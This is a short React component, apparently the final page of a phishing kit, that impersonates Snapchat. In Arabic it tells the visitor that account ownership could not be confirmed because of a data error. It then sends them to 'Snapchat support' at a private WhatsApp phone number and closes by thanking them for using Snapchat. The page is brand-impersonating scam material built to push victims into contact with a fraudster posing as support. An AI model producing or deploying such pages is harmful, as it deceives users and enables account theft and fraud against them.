export default function FinalPage() {
  return (
    <div className="snapchat-container">
      <div className="snapchat-card">
        <h1 className="snapchat-title">لم يتم تأكيد ملكيتك للحساب</h1>
        
        <div style={{ textAlign: 'center', marginBottom: '2rem', color: '#666' }}>
          <p style={{ fontSize: '0.95rem', lineHeight: '1.6' }}>
            لوجود خطأ في البيانات
          </p>
        </div>

        <div style={{ textAlign: 'center', marginBottom: '2rem' }}>
          <a
            href="https://wa.me/+201127267627"
            target="_blank"
            rel="noopener noreferrer"
            className="snapchat-link"
            style={{ fontSize: '1rem', fontWeight: '500' }}
          >
            تواصل مع دعم سناب شات عبر واتساب
          </a>
        </div>

        <div style={{ textAlign: 'center', marginTop: '3rem', color: '#999', fontSize: '0.9rem' }}>
          <p>شكراً على استخدامك سناب شات</p>
        </div>
      </div>
    </div>
  );
}
